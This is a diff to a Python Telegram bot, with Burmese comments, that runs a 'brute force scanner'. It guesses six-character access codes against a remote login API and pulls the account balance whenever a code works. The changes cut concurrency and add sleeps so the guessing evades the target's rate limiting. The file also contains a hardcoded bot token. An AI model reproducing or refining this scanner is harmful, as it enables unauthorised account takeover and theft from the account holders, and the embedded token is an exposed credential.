@@ -22,8 +22,8 @@ from telegram.ext import Application, ContextTypes, CommandHandler, CallbackQuer
 nest_asyncio.apply()
 
 # ── CONFIGURATION ──────────────────────────────────────────────────────────
-MAX_CONCURRENT = 100
-CONNECTION_LIMIT = 100
+MAX_CONCURRENT = 30  # မြန်နှုန်းကို ထိန်းရန် လျှော့ချထားသည်
+CONNECTION_LIMIT = 50
 ADMIN_USERNAME = "gobiln07"
 ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
 TOKEN = "8895305429:AAFUhYikhgaLWOMcxRSMzeMdYbxbYBN9QCM"
@@ -185,10 +185,14 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
 
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                 headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
+                
+                # Request အကြားတွင် Rate Limit မမိစေရန် အနည်းငယ် နှေးပေးခြင်း
+                await asyncio.sleep(0.15)
+
                 async with task_session.post(post_url, json=data, headers=headers, timeout=6) as req:
                     response = await req.text()
                     if 'request limited' in response:
-                        context_data['retry_total'] += 1; await asyncio.sleep(0.3); continue
+                        context_data['retry_total'] += 1; await asyncio.sleep(0.5); continue
                     if 'logonUrl' in response or '"success":true' in response:
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
@@ -235,9 +239,9 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
     code_gen = code_generator(mode)
 
     try:
-        status_msg = await query.message.reply_text(f"🚀 Direct Connection ဖြင့် စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
+        status_msg = await query.message.reply_text(f"🚀 တည်ငြိမ်သောနှုန်းဖြင့် စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
     except:
-        status_msg = await query.message.chat.send_message(f"🚀 Direct Connection ဖြင့် စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
+        status_msg = await query.message.chat.send_message(f"🚀 တည်ငြိမ်သောနှုန်းဖြင့် စကන්ဖတ်ခြင်း စတင်ပါပြီ (Mode: {mode})...")
 
     try:
         while not context.user_data.get('scan_stop', False):
@@ -257,7 +261,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             if context.user_data.get('scan_stop', False): break
 
             current_time = time.time()
-            if current_time - last_edit_time < 1.0:
+            if current_time - last_edit_time < 1.5:
                 continue
             last_edit_time = current_time
 
@@ -277,7 +281,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             text = (
                 f"⚡ **GOBLIN VIP SCANNER** ⚡\n"
                 f"━━━━━━━━━━━━━━━━━━━\n"
-                f"🔍 Status: Running (Direct)...\n"
+                f"🔍 Status: Running (Balanced)...\n"
                 f"📦 Checked: {checked_total:,} codes\n"
                 f"🔑 Current: `{current_code}`\n"
                 f"🎯 Hits Found: {hits}\n"
@@ -467,7 +471,7 @@ async def brute_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("အက္ခရာ 6 လုံး (a-z)", callback_data="scan_alpha6"), InlineKeyboardButton("အရောအနှော 6 လုံး (a-z, 0-9)", callback_data="scan_mix6")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
     ])
-    await query.message.reply_text("🚀 **Brute Force Scanner (Direct)**\n\nScan mode ကို ရွေးချယ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
+    await query.message.reply_text("🚀 **Brute Force Scanner (Balanced)**\n\nScan mode ကို ရွေးချယ်ပါ:", reply_markup=keyboard, parse_mode="Markdown")
 
 async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query if update.callback_query else None
@@ -509,7 +513,7 @@ async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def stop_scanning(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['scan_stop'] = True
-    await update.message.reply_text("🛑 **စကන්ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ။**", parse_mode="Markdown")
+    await update.message.reply_text("🛑 **စကන්ဖတ်ခြင်းကို ရပ်တန့်လိုက်ပါပြီ。**", parse_mode="Markdown")
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -564,7 +568,7 @@ def main():
     from telegram.ext import MessageHandler, filters
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
-    print("🚀 Telegram Bot (Direct Connection) စတင်အလုပ်လုပ်နေပါပြီ...")
+    print("🚀 Telegram Bot (Balanced Speed) စတင်အလုပ်လုပ်နေပါပြီ...")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
